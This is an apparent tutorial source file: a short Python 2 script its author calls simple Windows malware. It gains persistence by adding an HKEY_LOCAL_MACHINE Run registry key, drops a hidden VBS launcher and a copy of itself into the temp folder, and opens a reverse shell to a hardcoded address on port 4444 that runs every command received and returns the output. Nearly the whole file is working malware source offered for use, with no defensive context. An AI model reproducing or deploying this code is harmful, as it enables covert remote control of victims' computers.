# HACKING WITH PYTHON
# Simple malware for back connect in python for windows ;)

# Autor: anarc0der  

import os
import subprocess
import socket
import sys
import tempfile
from _winreg import *

MALWARE_NAME = "malware.exe"
TRIGGER = MALWARE_NAME.replace('.exe','')+".vbs"
KEY_PATH = "Software\Microsoft\Windows\CurrentVersion\Run"
KEY_NAME = "anarc0der_key"
REV_SHELL = "192.168.1.106"
SHELL_PORT = 4444
TRIGGER_PATH = tempfile.gettempdir()+"\\"+TRIGGER
MALWARE_PATH = tempfile.gettempdir()+"\\"+MALWARE_NAME

class My_malware():

    def infect_windows_register_keys(self):
        """ Method to register malware on windows keys.
            Returns False if didnt have key for malware.
            Returns True if already have key for malware. """
        key = OpenKey(HKEY_LOCAL_MACHINE, KEY_PATH)
        keys = []
        try:
            i=0
            while True:
                cur_key = EnumValue(key, i)
                keys.append(cur_key[0])
                i+=1
        except:
            pass
        if KEY_NAME not in keys:
            mlwr_key = OpenKey(HKEY_LOCAL_MACHINE, KEY_PATH, 0, KEY_ALL_ACCESS)
            SetValueEx(mlwr_key, KEY_NAME, 0, REG_SZ, TRIGGER_PATH)
            mlwr_key.Close()
            return False
        return True

    def hide_malware_and_trigger(self):
        """ Method to generate & hide the trigger and malware.
            Return True if was alredy hided.
            Return False if wasnt hided """
        if os.path.exists(MALWARE_PATH) and os.path.exists(TRIGGER_PATH):
            return True
        else:
            payload = 'Set WshShell = WScript.CreateObject("WScript.Shell")\nWshShell.Run """{0}""", 0 , false'.format(MALWARE_PATH)
            with open(TRIGGER_PATH, 'w') as f:
                f.write(payload)
            os.system('copy %s %s'%(MALWARE_NAME, MALWARE_PATH))
            return False

    def reverse_shell_function(self):
        """ Method of reverse shell in python """
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((REV_SHELL,SHELL_PORT))
        s.send('\n\!/ anarc0der mlwr tutorial\n\n[*] If you need to finish, just type: quit\n[*] PRESS ENTER TO PROMPT\n\n')
        while True:
            data = s.recv(1024)
            if "quit" in data:
                break
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            saida_cmd = cmd.stdout.read() + cmd.stderr.read()
            s.send(saida_cmd)
            s.send("Comando: ")
        s.close()

def main():
    my_returns = []
    x = My_malware()
    my_returns.append(x.infect_windows_register_keys())
    my_returns.append(x.hide_malware_and_trigger())
    if all(res is True for res in my_returns):
        x.reverse_shell_function()
    #os.system('dir')

if __name__ == '__main__':
    main()
